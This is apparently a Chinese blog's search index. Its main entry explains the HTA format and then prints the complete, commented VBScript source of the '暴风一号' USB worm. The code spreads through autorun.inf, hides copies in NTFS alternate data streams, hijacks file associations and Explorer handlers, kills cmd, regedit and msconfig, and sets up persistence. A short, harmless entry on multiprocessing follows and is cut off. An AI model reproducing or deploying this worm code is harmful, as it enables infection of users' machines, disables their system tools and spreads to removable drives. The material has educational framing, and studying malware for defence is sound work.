<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[【老物】MS-HTA格式]]></title>
    <url>%2F%E3%80%90%E8%80%81%E7%89%A9%E3%80%91MS-HTA%E6%A0%BC%E5%BC%8F.html</url>
    <content type="text"><![CDATA[HTA是Html Application的简写，也就是“基于html技术编写的应用程序”。它是Microsot在很久以前推出一门技术。作为一门技术，它已经很老了（和如今日新月异的前端技术比起来）。 查阅网上资料发现，HTA早在99年就已经被提出了，和我差不多大…… 入门教学下面是一个简单的实例，将它保存为xx.hta的形式，然后双击运行就可以看到效果。 语法参考html，如同在编写网页！ 1234567891011HTA - Hello WorldHTA - Hello World HTA支持html和vbscript、jscript（参考javascript），语法却更加随意。有人用HTA做了个简单的俄罗斯砖块，代码很少，不到500行。点我下载用HTA做的俄罗斯砖块小游戏。 当执行常规html文件时，执行仅限于web浏览器的安全模型，也就是说它仅限于与服务器通信，操纵页面的对象模型（通常用于验证表单或创建视觉效果）和读或写cookie。而hta作为完全受信任的应用程序运行，因此具有比普通html文件更多的权限。例如hta可以创建、编辑和删除文件和注册表项。虽然hta在此“可信”环境中运行，但查询Active Directory可能会受到Internet Explorer区域逻辑和相关错误消息的影响。 mshta命令（Winxp、8、10）Windows里用来运行HTA应用的解释器。 1mshta %要执行文件的绝对路径% HTA是解释运行的，类似于某些脚本语言。也就是说，只要HTA的那一部分没有破坏，我可以随心所欲的在源文件中添加我想要添加的东西——添加任何二进制数据，甚至在原始HTA文件添加一个完整的exe文件。 1copy /b %windir%\system32\calc.exe+a.hta a1.exe 这样制作成的exe文件，双击可以正常打开计算器。但是在命令行下调用mshta解释器会解释运行其中的HTA文档。 暴风一号（病毒）HTA格式相比于普通html文件具有如下特点： 都基于html动态脚本语言编写 HTA系统访问不受限制（不存在sandbox保护） HTA可以方便的绕过AV程序，它们的行为不像普通html那样被严格控制 暴风一号，原名Worm.Script.VBS.Autorun.be。这是一个由VBS脚本编写、采用加密和自变形手段，通过U盘传播的恶意蠕虫病毒。病毒行为包括：自变形、自复制、该注册表、遍历文件夹、关闭弹出光驱、锁定计算机、进程异常等。这是一个VBS病毒，可惜Microsoft已经彻底放弃把VBS作为前端语言了。现在VBS主要用来做些自动化，写点病毒什么的。 下面是“暴风一号”的真正源码。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622On Error Resume Next '//屏蔽出错信息，发生错误时继续向下执行Dim Fso,WshShell '//定义了两个变量'//创建并返回对 Automation 对象的引用。'//CreateObject(servername.typename [, location])'//servername 必选项。提供对象的应用程序名称。'//typename 必选项。要创建的对象类型或类。'//location 可选项。对象所在的网络服务器将被创建。'//说明Automation 服务器至少提供一种对象类型。例如，字处理应用程序可以提供应用程序对象、文档对象和工具条对象。Set Fso=CreateObject("scRiPTinG.fiLEsysTeMoBjEcT") '//为变量Fso赋值 创建 Scripting.FileSystemObject 对象 提供对计算机文件系统的访问Set WshShell=CreateObject("wScRipT.SHelL") '//为变量WshShell赋值 创建Wscript.Shell对象 用于获取系统环境变量的访问、创建快捷方式、访问Windows的特殊文件夹， '//以及添加或删除注册表条目。还可以使用Shell对象的功能创建更多的定制对话框以进行用户交互。Call Main() '//call 将控制权传递到sub或functionSub Main() '//sub、function 两种表示方法 sub没有返回值，function有返回值 On Error Resume Next Dim Args, VirusLoad, VirusAss Set Args=WScript.Arguments '//返回wsh对象的参数集 VirusLoad=GetMainVirus(1) '//获得System文件夹下smss.exe 蠕虫地址 VirusAss=GetMainVirus(0) '//获得Windows文件夹下explorer.exe 蠕虫地址 ArgNum=0 Do While ArgNum < Args.Count Param=Param&" "&Args(ArgNum) ArgNum=ArgNum + 1 Loop SubParam=LCase(Right(Param, 3)) '//LCase 返回字符串的小写形式 Right 从字符串右边返回指定数目的字符 Select Case SubParam '//select类似switch Case "run" '//当运行run时，同时启动病毒文件 RunPath=Left(WScript.ScriptFullName, 2) '//ScriptFullName属性返回当前正在运行的脚本的完整路径。该属性返回一个只读的字符串。 Call Run(RunPath) Call InvadeSystem(VirusLoad,VirusAss) Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad) Case "txt", "log","ini" ,"inf" '//运行"txt", "log", "ini", "inf"后缀名文件时，同时启动病毒文件 RunPath="%SystemRoot%/system32/NOTEPAD.EXE "&Param Call Run(RunPath) Call InvadeSystem(VirusLoad,VirusAss) Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad) Case "bat", "cmd" '//运行"bat", "cmd"批处理或命令提示符时，同时启动病毒文件 RunPath="CMD /c echo Hi!I'm here!&pause" Call Run(RunPath) Call InvadeSystem(VirusLoad,VirusAss) Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad) Case "reg" '//运行"reg"注册表导入程序时，同时启动病毒文件 RunPath="regedit.exe "&""""&Trim(Param)&"""" Call Run(RunPath) Call InvadeSystem(VirusLoad,VirusAss) Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad) Case "chm" '//运行"chm"帮助文件时，同时启动病毒文件 RunPath="hh.exe "&""""&Trim(Param)&"""" Call Run(RunPath) Call InvadeSystem(VirusLoad,VirusAss) Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad) Case "hlp" '//运行"hlp"帮助文件时，同时启动病毒文件 RunPath="winhlp32.exe "&""""&Trim(Param)&"""" Call Run(RunPath) Call InvadeSystem(VirusLoad,VirusAss) Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad) Case "dir" '//运行dir命令，同时启动病毒文件 RunPath=""""&Left(Trim(Param),Len(Trim(Param))-3)&"""" Call Run(RunPath) Call InvadeSystem(VirusLoad,VirusAss) Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad) Case "oie" '//打开我IE图标，同时启动病毒文件 RunPath="""%ProgramFiles%/Internet Explorer/IEXPLORE.EXE""" Call Run(RunPath) Call InvadeSystem(VirusLoad,VirusAss) Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad) Case "omc" '//打开我的电脑图标，同时启动病毒文件 RunPath="explorer.exe /n,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}" Call Run(RunPath) Call InvadeSystem(VirusLoad,VirusAss) Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad) Case "emc" '//劫持Win+E RunPath="explorer.exe /n,/e,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}" Call Run(RunPath) Call InvadeSystem(VirusLoad,VirusAss) Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad) Case Else If PreDblInstance=True Then '//如果条件满足，退出脚本宿主 WScript.Quit End If Timeout = Datediff("ww", GetInfectedDate, Date) - 12 If Timeout>0 And Month(Date) = Day(Date) Then Call VirusAlert() Call MakeJoke(CInt(Month(Date))) End If Call MonitorSystem() End SelectEnd Sub'//监视系统 结束taskmgr.exe、regedit.exe、msconfig.exe、cmd.exeSub MonitorSystem() On Error Resume Next Dim ProcessNames, ExeFullNames ProcessNames=Array("cmd.exe","cmd.com","regedit.exe","regedit.scr","regedit.pif","regedit.com","msconfig.exe") VBSFullNames=Array(GetMainVirus(1)) '//变量赋值 Do Call KillProcess(ProcessNames) '//如发现变量中的进程，调用结束进程函数 Call InvadeSystem(GetMainVirus(1),GetMainVirus(0)) '// smss.exe 蠕虫地址 explorer.exe 蠕虫地址 Call KeepProcess(VBSFullNames) '//保持病毒进程 WScript.Sleep 3000 '//脚本宿主等待时间为3000毫秒=3秒 LoopEnd Sub'//侵入系统Sub InvadeSystem(VirusLoadPath,VirusAssPath) On Error Resume Next Dim Load_Value, File_Value, IE_Value, MyCpt_Value1, MyCpt_Value2, HCULoad, HCUVer, VirusCode, Version Load_Value=""""&VirusLoadPath&"""" '//smss.exe的病毒流 File_Value="%SystemRoot%/System32/WScript.exe "&""""&VirusAssPath&""""&" %1 %* " '// explorer.exe 蠕虫 IE_Value="%SystemRoot%/System32/WScript.exe "&""""&VirusAssPath&""""&" OIE " '// 打开ie 蠕虫 MyCpt_Value1="%SystemRoot%/System32/WScript.exe "&""""&VirusAssPath&""""&" OMC " '//打开我的电脑 蠕虫 MyCpt_Value2="%SystemRoot%/System32/WScript.exe "&""""&VirusAssPath&""""&" EMC " '//劫持Win+E 蠕虫 HCULoad="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Load" HCUVer="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Ver" HCUDate="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Date" VirusCode=GetCode(WScript.ScriptFullName) Version=1 HostSourcePath=Fso.GetSpecialFolder(1)&"/Wscript.exe" HostFilePath=Fso.GetSpecialFolder(0)&"/system/svchost.exe" For Each Drive In Fso.Drives '//分别建立各个目录的病毒名字 If Drive.IsReady and (Drive.DriveType=1 Or Drive.DriveType=2 Or Drive.DriveType=3) Then DiskVirusName=GetSerialNumber(Drive.DriveLetter)&".vbs" Call CreateAutoRun(Drive.DriveLetter,DiskVirusName) '//创建自动运行 Call InfectRoot(Drive.DriveLetter,DiskVirusName) '//感染 End If Next If FSO.FileExists(VirusAssPath)=False Or FSO.FileExists(VirusLoadPath)=False Or FSO.FileExists(HostFilePath)=False Or GetVersion()< Version Then If GetFileSystemType(GetSystemDrive())="NTFS" Then '//判断是否为NTFS分区 Call CreateFile(VirusCode,VirusAssPath) Call CreateFile(VirusCode,VirusLoadPath) '//这一步创建了流文件 Call CopyFile(HostSourcePath,HostFilePath) '//这一步将wscript.exe从system32复制到system目录并改名svchost.exe Call SetHiddenAttr(HostFilePath) Else '//FAT32格式 Call CreateFile(VirusCode, VirusAssPath) Call SetHiddenAttr(VirusAssPath) Call CreateFile(VirusCode,VirusLoadPath) Call SetHiddenAttr(VirusLoadPath) Call CopyFile(HostSourcePath, HostFilePath) Call SetHiddenAttr(HostFilePath) End If End If If ReadReg(HCULoad)Load_Value Then '//改写注册表启动项，smss.exe的流 Call WriteReg (HCULoad, Load_Value, "") End If If GetVersion() < Version Then '//改写版本信息为1 Call WriteReg (HCUVer, Version, "") End If If GetInfectedDate() = "" Then Call WriteReg (HCUDate, Date, "") '//记录感染时间 End If '//以下更改许多文件关联,病毒的通用感染方式 If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/txtfile/shell/open/command/")File_Value Then Call SetTxtFileAss(VirusAssPath) End If If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inifile/shell/open/command/")File_Value Then Call SetIniFileAss(VirusAssPath) End If If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inffile/shell/open/command/")File_Value Then Call SetInfFileAss(VirusAssPath) End If If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/batfile/shell/open/command/")File_Value Then Call SetBatFileAss(VirusAssPath) End If If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/cmdfile/shell/open/command/")File_Value Then Call SetCmdFileAss(VirusAssPath) End If If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/regfile/shell/open/command/")File_Value Then Call SetRegFileAss(VirusAssPath) End If If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/chm.file/shell/open/command/")File_Value Then Call SetchmFileAss(VirusAssPath) End If If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/hlpfile/shell/open/command/")File_Value Then Call SethlpFileAss(VirusAssPath) End If If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/Applications/iexplore.exe/shell/open/command/")IE_Value Then Call SetIEAss(VirusAssPath) End If If ReadReg("HKEY_CLASSES_ROOT/CLSID/{871C5380-42A0-1069-A2EA-08002B30309D}/shell/OpenHomePage/Command/")IE_Value Then Call SetIEAss(VirusAssPath) End If If ReadReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/open/command/")MyCpt_Value1 Then Call SetMyComputerAss(VirusAssPath) End If If ReadReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/explore/command/")MyCpt_Value2 Then Call SetMyComputerAss(VirusAssPath) End If Call RegSet()End Sub'//拷贝文件Sub CopyFile(source, pathf) On Error Resume Next If FSO.FileExists(pathf) Then FSO.DeleteFile pathf , True End If FSO.CopyFile source, pathfEnd Sub'//创建文件Sub CreateFile(code, pathf) On Error Resume Next Dim FileText If FSO.FileExists(pathf) Then Set FileText=FSO.OpenTextFile(pathf, 2, False) FileText.Write code FileText.Close Else Set FileText=FSO.OpenTextFile(pathf, 2, True) FileText.Write code FileText.Close End IfEnd Sub'//注册表设置Sub RegSet() On Error Resume Next Dim RegPath1 , RegPath2, RegPath3, RegPath4 RegPath1="HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/Advanced/Folder/Hidden/NOHIDDEN/CheckedValue" RegPath2="HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/Advanced/Folder/Hidden/SHOWALL/CheckedValue" RegPath3="HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Policies/Explorer/NoDriveTypeAutoRun" RegPath4="HKEY_CLASSES_ROOT/lnkfile/IsShortcut" Call WriteReg (RegPath1, 3, "REG_DWORD") Call WriteReg (RegPath2, 2, "REG_DWORD") Call WriteReg (RegPath3, 0, "REG_DWORD") Call DeleteReg (RegPath4)End Sub'//结束进程Sub KillProcess(ProcessNames) On Error Resume Next Set WMIService=GetObject("winmgmts://./root/cimv2") For Each ProcessName in ProcessNames Set ProcessList=WMIService.execquery(" Select * From win32_process where name ='"&ProcessName&"' ") For Each Process in ProcessList IntReturn=Process.terminate If intReturn0 Then WshShell.Run "CMD /c ntsd -c q -p "&Process.Handle, vbHide, False End If Next NextEnd Sub'//删掉autorun.inf免疫目录Sub KillImmunity(D) On Error Resume Next ImmunityFolder=D&":/Autorun.inf" If Fso.FolderExists(ImmunityFolder) Then WshSHell.Run ("CMD /C CACLS "& """"&ImmunityFolder&"""" &" /t /e /c /g everyone:f"),vbHide,True '//提权 WshSHell.Run ("CMD /C RD /S /Q "& ImmunityFolder), vbHide, True '//rd命令删除，配合 /s /q 选项，很轻松 End IfEnd Sub'//保护病毒进程 保持脚本进程持续运行，少于2个创建新进程Sub KeepProcess(VBSFullNames) On Error Resume Next For Each VBSFullName in VBSFullNames If VBSProcessCount(VBSFullName) < 2 then Run("%SystemRoot%/system/svchost.exe "&VBSFullName) End If NextEnd Sub'//获得系统分区 c:'//FileSystemObject.GetSpecialFolder 返回指定特殊文件夹'//WindowsFolder 0 Windows 文件夹，包含 Windows 操作系统安装的文件。'//SystemFolder 1 System 文件夹，包含库、字体和设备驱动程序文件。'//TemporaryFolder 2 Temp 文件夹，用于保存临时文件。可以在 TMP 环境变量中找到该文件夹的路径。'//Left 返回指定数目的从字符串的左边算起的字符。Function GetSystemDrive() GetSystemDrive=Left(Fso.GetSpecialFolder(0),2)End Function'//FileSystemObject.GetDrive返回与指定的路径中驱动器相对应的 Drive 对象。Drive 提供对磁盘驱动器或网络共享的属性的访问。'//Drive.FileSystem返回指定的驱动器使用的文件系统的类型。Function GetFileSystemType(Drive) Set d=FSO.GetDrive(Drive) GetFileSystemType=d.FileSystemEnd Function'//读取注册表建值 返回所在路径Function ReadReg(strkey) Dim tmps Set tmps=CreateObject("WScript.Shell") ReadReg=tmps.RegRead(strkey) Set tmps=NothingEnd Function'//重写注册表键值Sub WriteReg(strkey, Value, vtype) Dim tmps Set tmps=CreateObject("WScript.Shell") If vtype="" Then tmps.RegWrite strkey, Value Else tmps.RegWrite strkey, Value, vtype End If Set tmps=NothingEnd Sub'//删除注册表键值Sub DeleteReg(strkey) Dim tmps Set tmps=CreateObject("WScript.Shell") tmps.RegDelete strkey Set tmps=NothingEnd Sub'//设置隐藏属性Sub SetHiddenAttr(path) On Error Resume Next Dim vf Set vf=FSO.GetFile(path) Set vf=FSO.GetFolder(path) vf.Attributes=6 '// 6=2+4 分别是隐藏、系统属性End Sub'//执行ExeFullName指定的文件Sub Run(ExeFullName) On Error Resume Next Dim WshShell Set WshShell=WScript.CreateObject("WScript.Shell") WshShell.Run ExeFullName Set WshShell=NothingEnd Sub'//感染根目录Sub InfectRoot(D,VirusName) On Error Resume Next Dim VBSCode VBSCode=GetCode(WScript.ScriptFullName) VBSPath=D&":/"&VirusName If FSO.FileExists(VBSPath)=False Then Call CreateFile(VBSCode, VBSPath) Call SetHiddenAttr(VBSPath) End If Set Folder=Fso.GetFolder(D&":/") '//隐藏根目录下的所有子目录 Set SubFolders=Folder.Subfolders For Each SubFolder In SubFolders SetHiddenAttr(SubFolder.Path) LnkPath=D&":/"&SubFolder.Name&".lnk" '//创建对应的快捷方式 TargetPath=D&":/"&VirusName Args=""""&D&":/"&SubFolder.Name& "/Dir""" If Fso.FileExists(LnkPath)=False Or GetTargetPath(LnkPath) TargetPath Then If Fso.FileExists(LnkPath)=True Then FSO.DeleteFile LnkPath, True End If Call CreateShortcut(LnkPath,TargetPath,Args) End If NextEnd Sub'//上一步失败了调用这个函数创建快捷方式Sub CreateShortcut(LnkPath,TargetPath,Args) Set Shortcut=WshShell.CreateShortcut(LnkPath) with Shortcut .TargetPath=TargetPath .Arguments=Args .WindowStyle=4 .IconLocation="%SystemRoot%/System32/Shell32.dll, 3" .Save end withEnd Sub'//创建autorun.inf文件Sub CreateAutoRun(D,VirusName) On Error Resume Next Dim InfPath, VBSPath, VBSCode InfPath=D&":/AutoRun.inf" VBSPath=D&":/"&VirusName VBSCode=GetCode(WScript.ScriptFullName) If FSO.FileExists(InfPath)=False Or FSO.FileExists(VBSPath)=False Then Call CreateFile(VBSCode, VBSPath) Call SetHiddenAttr(VBSPath) StrInf="[AutoRun]"&VBCRLF&"Shellexecute=WScript.exe "&VirusName&" ""AutoRun"""&VBCRLF&"shell/open=打开(&O)"&VBCRLF&"shell/open/command=WScript.exe "&VirusName&"""AutoRun"""&VBCRLF&"shell/open/Default=1"& VBCRLF&"shell/explore=资源管理器(&X)"&VBCRLF&"shell/explore/command=WScript.exe "&VirusName&" ""AutoRun""" Call KillImmunity(D) Call CreateFile(StrInf, InfPath) Call SetHiddenAttr(InfPath) End IfEnd Sub'//改变txt格式文件关联Sub SetTxtFileAss(sFilePath) On Error Resume Next Dim Value Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* " Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/txtfile/shell/open/command/", Value, "REG_EXPAND_SZ")End Sub'//改变ini格式文件关联Sub SetIniFileAss(sFilePath) On Error Resume Next Dim Value Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* " Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inifile/shell/open/command/", Value, "REG_EXPAND_SZ")End Sub'//改变inf格式文件关联Sub SetInfFileAss(sFilePath) On Error Resume Next Dim Value Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* " Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inffile/shell/open/command/", Value, "REG_EXPAND_SZ")End Sub'//改变bat格式文件关联Sub SetBatFileAss(sFilePath) On Error Resume Next Dim Value Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* " Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/batfile/shell/open/command/", Value, "REG_EXPAND_SZ")End Sub'//改变cmd格式文件关联Sub SetCmdFileAss(sFilePath) On Error Resume Next Dim Value Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* " Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/cmdfile/shell/open/command/", Value, "REG_EXPAND_SZ")End Sub'//改变hlp格式文件关联Sub SethlpFileAss(sFilePath) On Error Resume Next Dim Value Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* " Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/hlpfile/shell/open/command/", Value, "REG_EXPAND_SZ")End Sub'//改变reg格式文件关联Sub SetRegFileAss(sFilePath) On Error Resume Next Dim Value Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* " Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/regfile/shell/open/command/", Value, "REG_EXPAND_SZ")End Sub'//改变chm格式文件关联Sub SetchmFileAss(sFilePath) On Error Resume Next Dim Value Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* " Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/chm.file/shell/open/command/", Value, "REG_EXPAND_SZ")End Sub'//篡改IE启动设置Sub SetIEAss(sFilePath) On Error Resume Next Dim Value Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" OIE " Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/Applications/iexplore.exe/shell/open/command/", Value, "REG_EXPAND_SZ") Call WriteReg("HKEY_CLASSES_ROOT/CLSID/{871C5380-42A0-1069-A2EA-08002B30309D}/shell/OpenHomePage/Command/", Value, "REG_EXPAND_SZ")End Sub'//改变我的电脑的打开关联，包括Win+ESub SetMyComputerAss(sFilePath) On Error Resume Next Dim Value1,Value2 Value1="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" OMC " Value2="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" EMC " Call WriteReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/", "", "REG_SZ") Call WriteReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/open/command/", Value1, "REG_EXPAND_SZ") Call WriteReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/explore/command/", Value2, "REG_EXPAND_SZ")End Sub'//获得系统驱动盘符名 Drive.SerialNumber 盘符序列号 c-->驱动器 C: - 固定序列号：-1598325125、d-->驱动器 D: - 固定序列号：237835280、e、f。Function GetSerialNumber(Drv) On Error Resume Next Set d=fso.GetDrive(Drv) GetSerialNumber=d.SerialNumber '// 返回十进制序列号，用于唯一标识一个磁盘卷。Select Case d.DriveType Case 0: t = "未知" Case 1: t = "可移动" Case 2: t = "固定" '// Case 3: t = "网络" Case 4: t = "CD-ROM" Case 5: t = "RAM 磁盘" End Select GetSerialNumber=Replace(GetSerialNumber,"-","")End Function'//获得蠕虫病毒路径 &表示字符串相加 GetSpecialFolder 返回指定的特殊文件夹Function GetMainVirus(N) On Error Resume Next MainVirusName=GetSerialNumber(GetSystemDrive())&".vbs" If GetFileSystemType(GetSystemDrive())="NTFS" Then If N=1 Then '//System 文件夹，包含库、字体和设备驱动程序文件。 SystemFolder GetMainVirus=Fso.GetSpecialFolder(N)&"/smss.exe:"&MainVirusName '//返回 如c:/windows/system32/smss.exe:72161642.vbs End If If N=0 Then '//Windows 文件夹，包含 Windows 操作系统安装的文件。 WindowsFolder GetMainVirus=Fso.GetSpecialFolder(N)&"/explorer.exe:"&MainVirusName '//返回 如c:/windows/explorer.exe:72161642.vbs End If Else GetMainVirus=Fso.GetSpecialFolder(N)&"/"&MainVirusName End IfEnd Function'//返回指定路径vbs脚本的运行个数Function VBSProcessCount(VBSPath) On Error Resume Next Dim WMIService, ProcessList, Process VBSProcessCount=0 Set WMIService=GetObject("winmgmts://./root/cimv2") Set ProcessList=WMIService.ExecQuery("Select * from Win32_Process Where "&"Name='cscript.exe' or Name='wscript.exe' or Name='svchost.exe'") For Each Process in ProcessList If InStr(Process.CommandLine, VBSPath)>0 Then VBSProcessCount=VBSProcessCount+1 End If NextEnd Function'//'用来计数wscript进程的个数，如果大于等于3个那么返回TrueFunction PreDblInstance() On Error Resume Next PreDblInstance=False If VBSProcessCount(WScript.ScriptFullName)>= 3 Then PreDblInstance=True End IfEnd Function'//获取快捷方式的vbs脚本地址Function GetTargetPath(LnkPath) On Error Resume Next Dim Shortcut Set Shortcut=WshShell.CreateShortcut(LnkPath) GetTargetPath=Shortcut.TargetPathEnd Function'//读取文件 返回 TextStreamFunction GetCode(FullPath) On Error Resume Next Dim FileText Set FileText=FSO.OpenTextFile(FullPath, 1) '//打开指定的文件并返回一个 TextStream 对象，可以读取、写入此对象或将其追加到文件。 '// 1 以只读模式打开文件。不能对此文件进行写操作。 GetCode=FileText.ReadAll '//读入全部 TextStream 文件并返回结果字符串 FileText.CloseEnd Function'//获得注册表 版本键值 获取windows版本Function GetVersion() Dim VerInfo VerInfo="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Ver" If ReadReg(VerInfo)="" Then GetVersion=0 Else GetVersion=CInt(ReadReg(VerInfo)) '//CInt 返回表达式，此表达式已被转换为 Integer 子类型的 Variant。 End IfEnd Function'//网页文件BFAlert.htaSub VirusAlert() On Error Resume Next Dim HtaPath,HtaCode HtaPath=Fso.GetSpecialFolder(1)&"/BFAlert.hta" HtaCode="暴风一号"&VBCRLF&""&VBCRLF&""&VBCRLF&"N"&VBCRLF&"暴风一号"&VBCRLF&"" If FSO.FileExists(HtaPath)=False Then Call CreateFile(HtaCode, HtaPath) '//创建网页文件BFAlert.hta Call SetHiddenAttr(HtaPath) '//设置隐藏 End If Call Run(HtaPath)End Sub'//获得感染注册表时间键Function GetInfectedDate() On Error Resume Next Dim DateInfo DateInfo="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Date" If ReadReg(DateInfo)="" Then GetInfectedDate="" Else GetInfectedDate=CDate(ReadReg(DateInfo)) End IfEnd Function'//弹出光驱Sub MakeJoke(Times) On Error Resume Next Dim WMP, colCDROMs Set WMP = CreateObject( "WMPlayer.OCX" ) '//创建WMPlayer.OCX插件对象 Set colCDROMs = WMP.cdromCollection '//系统中光驱 If colCDROMs.Count >0 Then For i=1 to Times colCDROMs.Item(0).eject() '//退出抽取式设备 WScript.Sleep 3000 colCDROMs.Item(0).eject() Next End If Set WMP = NothingEnd Sub document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>旧物新篇</category>
      </categories>
      <tags>
        <tag>HTA病毒</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[多进程编程]]></title>
    <url>%2F%E5%A4%9A%E8%BF%9B%E7%A8%8B%E7%BC%96%E7%A8%8B.html</url>
    <content type="text"><![CDATA[由于GIL的存在，cpython在处理CPU密集型操作时无法使出真正的多线程，这时候就要用到多进程。多进程通常针对多核CPU，单核CPU要借助调度算法也可以达到几乎同样的效果。一个程序就是一个进程，多进程指的是多个程序同时进行。进程是资源分配的最小单位。 fork调用Unix/Linux提供fork()系统调用，用来创建新的进程。它不接受任何参数，返回创建进程的Process ID；调用fork的进程被称为父进程（parent process），由fork调用创建出的新进程叫该父进程的子进程（child Process）。 如果fork()返回负数，子进程创建失败 如果子进程创建成功，fork()的返回值 在子进程中返回0 在父进程中返回新创建子进程的进程id（为正数），返回的进程ID是sys/types.h中定义的pid_t类型。通常进程ID是整数。 此外进程可以使用函数getpid()来检索分配给此进程的进程ID. 下面是一个例子，点我下载1234567891011121314151617181920#include #include #include #define MAX_COUNT 200#define BUF_SIZE 100void main(void){ pid_t pid; int i; char buf[BUF_SIZE]; fork(); pid = getpid(); for (i = 1; i { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>并发编程</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[协程（二）]]></title>
    <url>%2F%E5%8D%8F%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89.html</url>
